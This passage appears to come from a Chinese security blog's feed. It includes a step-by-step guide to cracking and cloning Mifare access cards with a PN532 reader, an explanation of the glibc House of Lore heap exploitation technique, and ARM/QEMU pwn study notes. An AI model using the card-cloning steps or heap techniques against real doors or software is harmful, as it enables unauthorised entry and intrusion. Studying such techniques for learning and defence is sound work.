usb 拓展）</li><li><a href="https://github.com/xcicode/MifareOneTool/releases/tag/v1.7.0">MifareOneTool</a></li><li>CUID卡（复制到手机&amp;手环才需要）</li></ul><blockquote><p><a href="https://mrskye.lanzous.com/iMRVol83exe">https://mrskye.lanzous.com/iMRVol83exe</a><br>密码:mrskye</p></blockquote><h3 id="安装驱动-amp-链接-pn532"><a href="#安装驱动-amp-链接-pn532" class="headerlink" title="安装驱动&amp;链接 pn532"></a>安装驱动&amp;链接 pn532</h3><p>买 pn532 的时候搭配买上 ttl 转 usb 模块，usb 模块与 pn532 链接参考店家给的文档，只有 VCC 和 GND 不接翻都不会烧芯片。</p><p>怼上电脑后，如果打好驱动接线正确就能在设备管理器查看到（com 因电脑而异不一定相同）：</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202161020.png" alt="image-20210202161020718"></p><p>打开 m1T 检测链接，查看是否链接上 pn532 ，留意 com 是否和设备管理器的一致。</p><p><img src="https://gitee.com/mrskye/Picbed/raw/master/img/20210202161353.png" alt="image-20210202161353051"></p><h3 id="破译密码"><a href="#破译密码" class="headerlink" title="破译密码"></a>破译密码</h3><p>将卡片放上去，点击扫描卡片，确定识别到卡片。</p><p>识别到卡片后点击检测加密，如果半加密卡就很有戏，去加密的可以先试下，如果跑不出来就考虑试下 pm3 。</p><h4 id="半加密卡"><a href="#半加密卡" class="headerlink" title="半加密卡"></a>半加密卡</h4><p>如果不知道任何一个加密扇区密码就直接点一键解原卡</p><h4 id="全加密卡"><a href="#全加密卡" class="headerlink" title="全加密卡"></a>全加密卡</h4><p>选择上方高级操作模式，点击里面的全加密爆破</p><p>无论哪种卡成功解密完成后，软件都会弹窗提示保存 dump 数据，也就是卡片全部数据（含密码），保存后面需要用到。</p><h3 id="复制到卡片"><a href="#复制到卡片" class="headerlink" title="复制到卡片"></a>复制到卡片</h3><p>各地小区、电梯安全策略有高有低，如果使用成本低的 uid 卡不成功，改用 cuid 。两者区别是卡片的 uid 是否可改变，也就是 0 扇区的前 8 字节数据。</p><h4 id="写入-uid"><a href="#写入-uid" class="headerlink" title="写入 uid"></a>写入 uid</h4><p>点击写入普通卡，选择破译出来的 dump 文件。由于 uid 不能改，写入完成不能达到 64/64 。用破译出来密码读取一下卡片内容，确认是否成功写入数据。</p><h4 id="写入-cuid"><a href="#写入-cuid" class="headerlink" title="写入 cuid"></a>写入 cuid</h4><p>点击写入C\FUID卡，步骤同上，写入完成度可以达到 100% ，一样的读取写入卡片内容，确定是否成功写入，尤其是 0 扇区前 8 字节。</p><h4 id="写入手机或者手环"><a href="#写入手机或者手环" class="headerlink" title="写入手机或者手环"></a>写入手机或者手环</h4><p>复制一份 dump 文件，打开 m1T 打开高级操作模式，点击里面的 Hex编辑器，加载复制的 dump 文件。</p><p>打开 0 扇区复制第 0 块的前 8 位数字，即 uid 。新建一份文件，点击工具修改 UID ，粘贴 8 位数字，保存这个份文件。依照上面操作写入到 cuid 里面。</p><p>将该 cuid 复制到手机里面，打开手机刷卡，放到 pn532 上面，重复写入 cuid 的布置，这次写入的是完整的 dumo 文件。</p><p><a href="http://pm3.echo.cool/index.php/2019/03/24/pn532%E5%B7%A5%E5%85%B7%E5%90%88%E9%9B%86/">PN532工具合集</a></p><p><a href="http://pm3.echo.cool/index.php/2019/03/23/nfc%e8%8a%af%e7%89%87-pn532%e7%9a%84%e4%bd%bf%e7%94%a8/">pn532 指令参数</a></p><p><a href="http://pm3.echo.cool/">Proxmark 实验室</a></p>]]></content>
      
      
      
        <tags>
            
            <tag> nfc </tag>
            
            <tag> PN532 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>House_of_Lore</title>
      <link href="archives/114d7ffc/"/>
      <url>archives/114d7ffc/</url>
      
        <content type="html"><![CDATA[<h1 id="House-of-Lore"><a href="#House-of-Lore" class="headerlink" title="House of Lore"></a>House of Lore</h1><h2 id="基本信息"><a href="#基本信息" class="headerlink" title="基本信息"></a>基本信息</h2><p>smallbin 是双向链表，每次 malloc 取出链表最后最后一个堆块，进行 unlink 取出。house of lore 目标是控制 smallbin 的 bk 指针，及 fake_chunk bk 指针，实现分配任意指定地址的堆。</p><h2 id="原理分析"><a href="#原理分析" class="headerlink" title="原理分析"></a>原理分析</h2><p>malloc 申请堆块进入到 smallbin 判断函数时：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//glibc/malloc/malloc.c</span></span><br><span class="line"><span class="comment">/*</span></span><br><span class="line"><span class="comment">       If a small request, check regular bin.  Since these &quot;smallbins&quot;</span></span><br><span class="line"><span class="comment">       hold one size each, no searching within bins is necessary.</span></span><br><span class="line"><span class="comment">       (For a large request, we need to wait until unsorted chunks are</span></span><br><span class="line"><span class="comment">       processed to find best fit. But for small ones, fits are exact</span></span><br><span class="line"><span class="comment">       anyway, so we can check now, which is faster.)</span></span><br><span class="line"><span class="comment">     */</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> (in_smallbin_range(nb)) &#123;</span><br><span class="line">        <span class="comment">// 获取 small bin 的索引</span></span><br><span class="line">        idx = smallbin_index(nb);</span><br><span class="line">        <span class="comment">// 获取对应 small bin 中的 chunk 指针</span></span><br><span class="line">        bin = bin_at(av, idx);</span><br><span class="line">        <span class="comment">// 先执行 victim= last(bin)，获取 small bin 的最后一个 chunk</span></span><br><span class="line">        <span class="comment">// 如果 victim = bin ，那说明该 bin 为空。</span></span><br><span class="line">        <span class="comment">// 如果不相等，那么会有两种情况</span></span><br><span class="line">        <span class="keyword">if</span> ((victim = last(bin)) != bin) &#123;</span><br><span class="line">            <span class="comment">// 第一种情况，small bin 还没有初始化。</span></span><br><span class="line">            <span class="keyword">if</span> (victim == <span class="number">0</span>) <span class="comment">/* initialization check */</span></span><br><span class="line">                <span class="comment">// 执行初始化，将 fast bins 中的 chunk 进行合并</span></span><br><span class="line">                malloc_consolidate(av);</span><br><span class="line">            <span class="comment">// 第二种情况，small bin 中存在空闲的 chunk</span></span><br><span class="line">            <span class="keyword">else</span> &#123;</span><br><span class="line">                <span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">                bck = victim-&gt;bk;</span><br><span class="line">                <span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line">                <span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">                    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">                    <span class="keyword">goto</span> errout;</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">                set_inuse_bit_at_offset(victim, nb);</span><br><span class="line">                <span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">                bin-&gt;bk = bck;</span><br><span class="line">                bck-&gt;fd = bin;</span><br><span class="line">                <span class="comment">// 如果不是 main_arena，设置对应的标志</span></span><br><span class="line">                <span class="keyword">if</span> (av != &amp;main_arena) set_non_main_arena(victim);</span><br><span class="line">                <span class="comment">// 细致的检查</span></span><br><span class="line">                check_malloced_chunk(av, victim, nb);</span><br><span class="line">                <span class="comment">// 将申请到的 chunk 转化为对应的 mem 状态</span></span><br><span class="line">                <span class="keyword">void</span> *p = chunk2mem(victim);</span><br><span class="line">                <span class="comment">// 如果设置了 perturb_type , 则将获取到的chunk初始化为 perturb_type ^ 0xff</span></span><br><span class="line">                alloc_perturb(p, bytes);</span><br><span class="line">                <span class="keyword">return</span> p;</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>如果我们可以修改 small bin 的最后一个 chunk 的 bk 为我们指定内存地址的 fake chunk，并且同时满足之后的 bck-&gt;fd != victim 的检测，那么我们就可以使得 small bin 的 bk 恰好为我们构造的 fake chunk。也就是说，当下一次申请 small bin 的时候，我们就会分配到指定位置的 fake chunk。关键代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 获取 small bin 中倒数第二个 chunk 。</span></span><br><span class="line">bck = victim-&gt;bk;</span><br><span class="line"><span class="comment">// 检查 bck-&gt;fd 是不是 victim，防止伪造</span></span><br><span class="line"><span class="keyword">if</span> (__glibc_unlikely(bck-&gt;fd != victim)) &#123;</span><br><span class="line">    errstr = <span class="string">&quot;malloc(): smallbin double linked list corrupted&quot;</span>;</span><br><span class="line">    <span class="keyword">goto</span> errout;</span><br><span class="line">&#125;</span><br><span class="line"><span class="comment">// 设置 victim 对应的 inuse 位</span></span><br><span class="line">set_inuse_bit_at_offset(victim, nb);</span><br><span class="line"><span class="comment">// 修改 small bin 链表，将 small bin 的最后一个 chunk 取出来</span></span><br><span class="line">bin-&gt;bk = bck;</span><br><span class="line">bck-&gt;fd = bin;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> PWN </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PWN </tag>
            
            <tag> house of Lore </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARM学习笔记</title>
      <link href="archives/efe6e61e/"/>
      <url>archives/efe6e61e/</url>
      
        <content type="html"><![CDATA[<h1 id="环境搭建（基于Ubuntu18-04"><a href="#环境搭建（基于Ubuntu18-04" class="headerlink" title="环境搭建（基于Ubuntu18.04)"></a>环境搭建（基于Ubuntu18.04)</h1><blockquote><p>目前问题是ubuntu18下，在我的虚拟机中pwndbg和gdb-multiarch不能兼容，其他师傅却可以。尝试换成gef，结果gdb不行了反而gdb-multiarch可以。</p><p>现阶段决定先在16编译qemu4.2先用着，到时再去嫖一个别人的镜像吧，因为我的这镜像也是多问题。。。</p></blockquote><h2 id="安装-qemu"><a href="#安装-qemu" class="headerlink" title="安装 qemu"></a>安装 qemu</h2><h3 id="使用包管理"><a href="#使用包管理" class="headerlink" title="使用包管理"></a>使用包管理</h3><p>查了下包管理器安装的版本停留在 2.x 版本，考虑到最近有的程序要用新版本才能加载，放弃这种方式安装</p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">查看apt安装版本</span></span><br><span class="line">apt-cache madison qemu</span><br><span class="line"></span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://mirrors.aliyun.com/ubuntu bionic-security/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://mirrors.aliyun.com/ubuntu bionic-updates/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://cn.archive.ubuntu.com/ubuntu bionic-updates/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://security.ubuntu.com/ubuntu bionic-security/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7 | http://mirrors.aliyun.com/ubuntu bionic/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7 | http://cn.archive.ubuntu.com/ubuntu bionic/universe amd64 Packages</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7 | http://mirrors.aliyun.com/ubuntu bionic/main Sources</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://mirrors.aliyun.com/ubuntu bionic-security/main Sources</span><br><span class="line">      qemu | 1:2.11+dfsg-1ubuntu7.34 | http://mirrors.aliyun.com/ubuntu bionic-updates/main Sources</span><br></pre></td></tr></table></figure><h3 id="从源码编译安装"><a href="#从源码编译安装" class="headerlink" title="从源码编译安装"></a>从源码编译安装</h3><h4 id="下载源码"><a href="#下载源码" class="headerlink" title="下载源码"></a>下载源码</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">wget https://download.qemu.org/qemu-5.2.0.tar.xz</span><br><span class="line">tar xvJf qemu-5.2.0.tar.xz</span><br><span class="line">cd qemu-5.2.0</span><br></pre></td></tr></table></figure><h4 id="处理依赖"><a href="#处理依赖" class="headerlink" title="处理依赖"></a>处理依赖</h4><blockquote><p>这里依赖是根据本机环境来装，可能有些需要的依赖已经安装完成</p></blockquote><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">sudo apt-get update</span><br><span class="line">sudo apt-get install libglib2.0-dev</span><br><span class="line">sudo apt-get install libpixman-1-dev</span><br><span class="line"><span class="meta">#</span><span class="bash"> re2c</span></span><br><span class="line">sudo apt-get install re2c</span><br><span class="line"><span class="meta">#</span><span class="bash"> ninja</span> </span><br><span class="line">sudo apt-get install ninja-build</span><br><span class="line"><span class="meta">#</span><span class="bash"> other</span></span><br><span class="line">sudo apt install pkg-config</span><br><span class="line">sudo apt install libglib2.0-dev</span><br><span class="line">sudo apt install libpixman-1-dev</span><br></pre></td></tr></table></figure><h4 id="编译安装"><a href="#编译安装" class="headerlink" title="编译安装"></a>编译安装</h4><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">sudo ./configure --static</span><br><span class="line">sudo make -j4 # 多线程编译自行调整</span><br><span class="line">sudo make install </span><br></pre></td></tr></table></figure><blockquote><p>学了路由器挖洞后发现，如果是动态链接需要将 qemu 运行库也拉到当前目录下面，可能会和固件的 lib 文件夹共用，文件重名等，所以后来将 qemu 换成了静态编译就直接把程序拖过去就行了。</p></blockquote><p><code>./configure</code> 使用默认选项安装全部架构的环境，安装路径在 <code>/usr/local/bin</code></p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">Install prefix: /usr/local</span><br><span class="line">         BIOS directory: share/qemu</span><br><span class="line">          firmware path: /usr/local/share/qemu-firmware</span><br><span class="line">       binary directory: bin</span><br><span class="line">      library directory: lib</span><br><span class="line">       module directory: lib/qemu</span><br><span class="line">      libexec directory: libexec</span><br><span class="line">      include directory: include</span><br><span class="line">       config directory: /usr/local/etc</span><br><span class="line">  local state directory: /usr/local/var</span><br><span class="line">       Manual directory: share/man</span><br><span class="line">          Doc directory: /usr/local/share/doc</span><br><span class="line">        Build directory: /home/skye/qemu-5.2.0/build</span><br><span class="line">            Source path: /home/skye/qemu-5.2.0</span><br></pre></td></tr></table></figure><h3 id="验证安装成功"><a href="#验证安装成功" class="headerlink" title="验证安装成功"></a>验证安装成功</h3><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">~$</span><span class="bash"> qemu-arm --version</span></span><br><span class="line">qemu-arm version 5.2.0</span><br><span class="line">Copyright (c) 2003-2020 Fabrice Bellard and the QEMU Project developers</span><br></pre></td></tr></table></figure><p>到这里就能直接运行静态编译的多架构程序。可选清一下中间文件 <code>make clean</code></p><h2 id="安装动态运行库"><a href="#安装动态运行库" class="headerlink" title="安装动态运行库"></a>安装动态运行库</h2><p>使用命令<code>apt-cache search &quot;libc6&quot; | grep &quot;&#123;架构名称&#125;&quot;</code>搜索并筛选可用的多架构运行库。</p><p>我们只需要安装形如<code>libc6-*-cross</code>的运行库即可。</p><h2 id="安装binutils环境"><a href="#安装binutils环境" class="headerlink" title="安装binutils环境"></a>安装binutils环境</h2><blockquote><p>原因：避免 pwntools 用 asm 时出错<a href="https://www.anquanke.com/post/id/199112#h3-10">LINK</a></p></blockquote><p>需要安装binutils依赖，首先使用命令<code>apt search binutils | grep [arch]</code>(此处的[arch]请自行替换)，随后安装显示出的包即可完成。</p><h2 id="参考文章"><a href="#参考文章" class="headerlink" title="参考文章"></a>参考文章</h2><p><a href="https://blog.csdn.net/wuu1010/article/details/104998804/">编译和安装QEMU-5.0.0</a></p><p><a href="https://ctf-wiki.github.io/ctf-tools/binary-core-tools/virtualization/qemu/qemu-install-and-debug/">qemu安装与调试</a></p><p><a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">如何 pwn 掉一个 arm 的binary</a></p><p><a href="https://www.anquanke.com/post/id/199112">ARM架构下的 Pwn 的一般解决思路</a></p><h1 id="qemu-使用"><a href="#qemu-使用" class="headerlink" title="qemu 使用"></a>qemu 使用</h1><h2 id="一般调试"><a href="#一般调试" class="headerlink" title="一般调试"></a>一般调试</h2><p>以调试方式启动程序，程序启动后命中开头断点，等待 gdb 链接调试 </p><figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">qemu-arm -g [port] -L [dynamically linked file] filename</span><br></pre></td></tr></table></figure><p>新建终端 <code>gdb-multiarch filename -q</code> 启动 gdb </p><p>进入GDB后，首先使用命令<code>set architecture [Arch-name]</code>设置架构。(若安装了能自动识别架构的GDB插件这一步可以省略)</p><p>然后使用<code>target remote localhost:[port]</code>来链接待调试的程序。(在GEF插件中，若想继续使用GEF插件的部分特性需要将命令改为<code>gef-remote localhost:[port]</code>)</p><p>调试其他架构和运行库分别调整 qemu 和 -L 参数</p><h2 id="脚本模板"><a href="#脚本模板" class="headerlink" title="脚本模板"></a>脚本模板</h2><blockquote><p>From:<a href="https://m4x.fun/post/how-2-pwn-an-arm-binary/">:link:</a></p><p>使用 context.binary 指定 binary 时, 就可以不用指定 context.arch, context.os 等参数</p></blockquote><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="keyword">import</span> sys</span><br><span class="line">context.binary = <span class="string">&quot;your_binary&quot;</span></span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;r&quot;</span>:</span><br><span class="line">    p = remote(<span class="string">&quot;remote_addr&quot;</span>, remote_port)</span><br><span class="line"><span class="keyword">elif</span> sys.argv[<span class="number">1</span>] == <span class="string">&quot;l&quot;</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;your_binary&quot;</span>])</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    p = process([<span class="string">&quot;qemu-arm&quot;</span>, <span class="string">&quot;-g&quot;</span>, <span class="string">&quot;1234&quot;</span>, <span class="string">&quot;-L&quot;</span>, <span class="string">&quot;/usr/arm-linux-gnueabi&quot;</span>, <span class="string">&quot;your_binary&quot;</span>])</span><br><span class="line"></span><br><span class="line">elf = ELF(<span class="string">&quot;your_binary&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/usr/arm-linux-gnueabi/lib/libc.so.6&quot;</span>)</span><br></pre></td></tr></table></figure><h1 id="ARM架构"><a href="#ARM架构" class="headerlink" title="ARM架构"></a>ARM架构</h1><p>ARM架构使用了与Intel/AMD架构所不同的精简指令集(RISC)，因此其函数调用约定以及寄存器也有了一定的差异。</p><h2 id="寄存器规则"><a href="#寄存器规则" class="headerlink" title="寄存器规则"></a>寄存器规则</h2><p><img src="https://courses.washington.edu/cp105/_images/ARM_Calling_Convention.png" alt="img"></p><ol><li>子程序间通过寄存器<strong>R0～R3</strong>来<strong>传递参数</strong>。这时，寄存器R0～R3可记作arg0～arg3。<strong>被调用的子程序在返回前无需恢复寄存器R0～R3的内容，R0被用来存储函数调用的返回值</strong>。</li><li>在子程序中，使用寄存器<strong>R4～R11</strong>来<strong>保存局部变量</strong>。这时，寄存器R4～R11可以记作var1～var8。如果在子程序中使用了寄存器v1～v8中的某些寄存器，则<strong>子程序进入时必须保存这些寄存器的值，在返回前必须恢复这些寄存器的值</strong>。<strong>R7经常被用作存储系统调用号，R11存放着帮助我们找到栈帧边界的指针，记作FP</strong>。在Thumb程序中，通常只能使用寄存器R4～R7来保存局部变量。</li><li>寄存器<strong>R12</strong>用作<strong>过程调用中间临时寄存器</strong>，记作IP。在子程序之间的连接代码段中常常有这种使用规则。</li><li>寄存器<strong>R13</strong>用作<strong>堆栈指针</strong>，记作SP。在子程序中寄存器R13不能用作其他用途。<strong>寄存器SP在进入子程序时的值和退出子程序时的值必须相等</strong>。</li><li>寄存器<strong>R14</strong>称为<strong>连接寄存器</strong>，记作LR。它用于<strong>保存子程序的返回地址</strong>。如果在子程序中保存了返回地址，寄存器R14则可以用作其他用途。</li><li>寄存器<strong>R15</strong>是<strong>程序计数器</strong>，记作PC。它不能用作其它用途。当执行一个分支指令时，<strong>PC存储目的地址。在程序执行中，ARM模式下的PC存储着当前指令加8(两条ARM指令后)的位置，Thumb(v1)模式下的PC存储着当前指令加4(两条Thumb指令后)的位置</strong>。</li></ol><h2 id="ARM寄存器与Intel寄存器对照关系"><a href="#ARM寄存器与Intel寄存器对照关系" class="headerlink" title="ARM寄存器与Intel寄存器对照关系"></a>ARM寄存器与Intel寄存器对照关系</h2><table><thead><tr><th align="center">ARM架构 寄存器名</th><th align="center">寄存器描述</th><th align="center">Intel架构 寄存器名</th></tr></thead><tbody><tr><td align="center">R0</td><td align="center">通用寄存器</td><td align="center">EAX</td></tr><tr><td align="center">R1~R5</td><td align="center">通用寄存器</td><td align="center">EBX、ECX、EDX、EDI、ESI</td></tr><tr><td align="center">R6~R10</td><td align="center">通用寄存器</td><td align="center">无</td></tr><tr><td align="center">R11(FP)</td><td align="center">栈帧指针</td><td align="center">EBP</td></tr><tr><td align="center">R12(IP)</td><td align="center">内部程序调用</td><td align="center">无</td></tr><tr><td align="center">R13(SP)</td><td align="center">堆栈指针</td><td align="center">ESP</td></tr><tr><td align="center">R14(LR)</td><td align="center">链接寄存器</td><td align="center">无</td></tr><tr><td align="center">R15(PC)</td><td align="center">程序计数器</td><td align="center">EIP</td></tr><tr><td align="center">CPSR</td><td align="center">程序状态寄存器</td><td align="center">EFLAGS</td></tr></tbody></table><h2 id="堆栈-Stack-规则"><a href="#堆栈-Stack-规则" class="headerlink" title="堆栈(Stack)规则"></a>堆栈(Stack)规则</h2><p>ATPCS规定堆栈为FD类型，即Full Descending，意思是 <strong>SP指向最后一个压入的值(栈顶)，数据栈由高地址向低地址生长</strong>，即满递减堆栈，并且对堆栈的操作是8字节对齐。所以经常使用的指令就有<strong>STMFD和LDMFD</strong>。</p><h3 id="STMFD"><a href="#STMFD" class="headerlink" title="STMFD"></a>STMFD</h3><p>STMFD指令即Store Multiple FULL Descending指令，相当于压栈。<code>STMFD SP! ,&#123;R0-R7，LR&#125;</code>实际上会执行以下命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = SP - <span class="number">9</span> x <span class="number">4</span> <span class="comment">//(共计压入R0-R7以及LR一共九个寄存器)</span></span><br><span class="line">ADDRESS = SP</span><br><span class="line">MEMORY[ADDRESS] = LR</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">7</span> to <span class="number">0</span></span><br><span class="line">    MEMORY[ADDRESS] = Ri</span><br><span class="line">    ADDRESS = ADDRESS + <span class="number">4</span></span><br></pre></td></tr></table></figure><p>此处也可以看出，事实上的入栈顺序与<code>R0-R7，LR</code>相反。</p><p>执行<code>SP = SP - 9 x 4</code>后<a href="https://img.lhyerror404.cn/error404/2020-02-03-032143.png"><img src="https://img.lhyerror404.cn/error404/2020-02-03-032143.png" alt="image-20200203112143013"></a></p><p>执行<code>ADDRESS = SP</code>后 <img src="https://img.lhyerror404.cn/error404/2020-02-03-032503.png" alt="image-20200203112502852"></p><p>执行<code>MEMORY[ADDRESS] = LR</code>后<img src="https://img.lhyerror404.cn/error404/2020-02-03-032741.png" alt="image-20200203112741279"></p><p>接下来，<code>ADDRESS</code>逐次上移，以此填入寄存器的值。<img src="https://img.lhyerror404.cn/error404/2020-02-03-032925.png" alt="image-20200203112924692"></p><p>至此，入栈指令执行结束。若入栈指令为<code>STMFD SP ,&#123;R0-R7，LR&#125;</code>，SP指针会在最后回到原位，不会改变SP指针的值。</p><h3 id="LDMFD"><a href="#LDMFD" class="headerlink" title="LDMFD"></a>LDMFD</h3><p>LDMFD指令即Load Multiple FULL Descending指令，相当于出栈，也就是STMFD指令的逆操作。<code>LDMFD SP! ,&#123;R0-R7，LR&#125;</code>实际上会执行以下命令：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">SP = SP + <span class="number">9</span> x <span class="number">4</span></span><br><span class="line">ADDRESS = SP</span><br><span class="line"><span class="keyword">for</span> i = <span class="number">0</span> to <span class="number">7</span></span><br><span class="line">    Ri = MEMORY[ADDRESS]</span><br><span class="line">    ADDRESS = ADDRESS - <span class="number">4</span></span><br><span class="line">LR = MEMORY[ADDRESS]</span><br></pre></td></tr></table></figure><h2 id="传参规则"><a href="#传参规则" class="headerlink" title="传参规则"></a>传参规则</h2><ol><li>对于参数个数可变的子程序，当参数个数不超过4个时，可以使用寄存器R0～R3来传递参数；当参数超过4个时，还可以使用堆栈来传递参数。</li><li>在传递参数时，将所有参数看作是存放在连续的内存<strong>字单元</strong>的字数据。然后，依次将各字数据传递到寄存器R0，R1，R2和R3中。<strong>如果参数多于4个，则将剩余的字数据传递到堆栈中。入栈的顺序与参数传递顺序相反，即最后一个字数据先入栈。</strong></li></ol><h2 id="返回值规则"><a href="#返回值规则" class="headerlink" title="返回值规则"></a>返回值规则</h2><ol><li>结果为一个32位整数时，可以通过寄存器R0返回</li><li>结果为一个64位整数时，可以通过寄存器R0和R1返回</li><li>结果为一个浮点数时，可以通过浮点运算部件的寄存器f0、d0或s0来返回</li><li>结果为复合型浮点数（如复数）时，可以通过寄存器f0～fn或d0～dn来返回</li><li>对于位数更多的结果，需要通过内存来传递。</li></ol><h2 id="访址规则"><a href="#访址规则" class="headerlink" title="访址规则"></a>访址规则</h2><h3 id="寄存器直接取址"><a href="#寄存器直接取址" class="headerlink" title="寄存器直接取址"></a>寄存器直接取址</h3><p>通常， LDR 指令被用来从内存中加载数据到寄存器， STR 指令被用作将寄存器的值存放到内存中。</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ LDR操作：从R0指向的地址中取值放到R2中</span><br><span class="line">LDR R2, [R0]   @ [R0] - 数据源地址来自于R0指向的内存地址</span><br></pre></td></tr></table></figure><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">@ STR操作：将R2中的值放到R1指向的地址中</span><br><span class="line">STR R2, [R1]   @ [R1] - 目的地址来自于R1在内存中指向的地址</span><br></pre></td></tr></table></figure><p>示例代码</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span 